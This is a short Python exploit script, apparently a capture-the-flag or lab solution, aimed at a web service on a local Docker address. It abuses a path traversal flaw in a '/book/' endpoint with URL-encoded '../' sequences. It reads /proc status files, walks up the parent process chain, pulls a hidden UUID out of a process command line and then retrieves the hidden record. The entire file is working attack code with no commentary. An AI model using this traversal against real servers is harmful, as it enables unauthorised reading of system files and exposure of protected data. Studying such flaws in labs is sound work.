import requests
import re

HOST = 'http://172.17.0.2:3000'

PPID = re.compile(r'PPid:\s*(\d+)')
STATUS = '..%2F..%2Fproc%2F{}%2Fstatus'

r = requests.get(f'{HOST}/book/{STATUS.format('self')}').text
ppid = PPID.search(r).group(1)
print(ppid)

r = requests.get(f'{HOST}/book/{STATUS.format(ppid)}').text
ppid = PPID.search(r).group(1)
print(ppid)

r = requests.get(f'{HOST}/book/{STATUS.format(ppid)}').text
ppid = PPID.search(r).group(1)

r = requests.get(f'{HOST}/book/..%2F..%2Fproc%2F{ppid}%2Fcmdline').text
id = re.search('/([a-f0-9-]{36})', r).group(1)

r = requests.get(f'{HOST}/book/{id}').text
print(r.split('\n')[0])